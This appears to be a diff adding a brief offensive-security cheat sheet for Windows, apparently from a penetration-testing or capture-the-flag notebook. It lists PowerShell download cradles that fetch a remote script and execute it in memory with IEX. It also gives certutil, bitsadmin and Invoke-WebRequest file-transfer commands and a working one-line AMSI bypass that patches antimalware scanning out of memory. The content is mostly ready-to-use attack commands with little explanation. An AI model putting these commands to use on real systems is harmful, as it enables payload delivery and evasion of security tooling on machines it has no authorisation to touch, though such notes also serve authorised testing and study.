@@ -1,0 +1,16 @@
+Download Tool Method:
+    wont load to disk:
+        (new-object system.net.webclient).downloadstring('http://192.168.0.0/tool.ps1') | IEX
+    
+    load to disk
+        (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.0/tool.exe', 'tool.exe')
+        iwr -uri http://192.168.0.0/tool.exe -OutFile tool.exe
+
+    # Download file from host machine
+        metasploit: upload <your dir> <target dir>
+        certutil -urlcache -split -f http://<your ip>/ <target dir>
+        bitsadmin /Transfer myJob http://<your ip>/ <target dir>
+
+Disable AMSI to make download success
+    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
